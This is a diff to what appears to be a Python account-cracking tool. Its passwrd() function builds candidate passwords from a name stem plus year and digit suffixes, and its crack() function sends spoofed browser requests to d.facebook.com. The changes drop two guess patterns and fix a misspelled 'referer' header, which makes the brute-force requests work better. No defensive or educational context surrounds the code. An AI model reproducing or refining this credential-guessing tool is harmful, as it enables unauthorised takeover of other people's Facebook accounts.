@@ -558,8 +558,6 @@ def passwrd():
                     pwv.append(frs+'1999')
                     pwv.append(frs+'1998')
                     pwv.append(frs+'1997')
-                    pwv.append('1122334455'+frs)
-                    pwv.append('11223344'+frs)
                     pwv.append(frs+'1122')
                     pwv.append(frs+'112233')
                     pwv.append(frs+'11223344')
@@ -587,8 +585,6 @@ def passwrd():
                     pwv.append(frs+'1999')
                     pwv.append(frs+'1998')
                     pwv.append(frs+'1997')
-                    pwv.append('1122334455'+frs)
-                    pwv.append('11223344'+frs)
                     pwv.append(frs+'1122')
                     pwv.append(frs+'112233')
                     pwv.append(frs+'11223344')
@@ -644,7 +640,7 @@ def crack(idf,pwv):
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
-    'raferer': 'https://d.facebook.com/',
+    'referer': 'https://d.facebook.com/',
     'upgrade-insecure-requests': '1',
     'user-agent': ua,
     'viewport-width': '980',
@@ -669,7 +665,7 @@ def crack(idf,pwv):
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
-    'raferer': 'https://d.facebook.com/',
+    'referer': 'https://d.facebook.com/',
     'upgrade-insecure-requests': '1',
     'user-agent': ua,
     'viewport-width': '980',
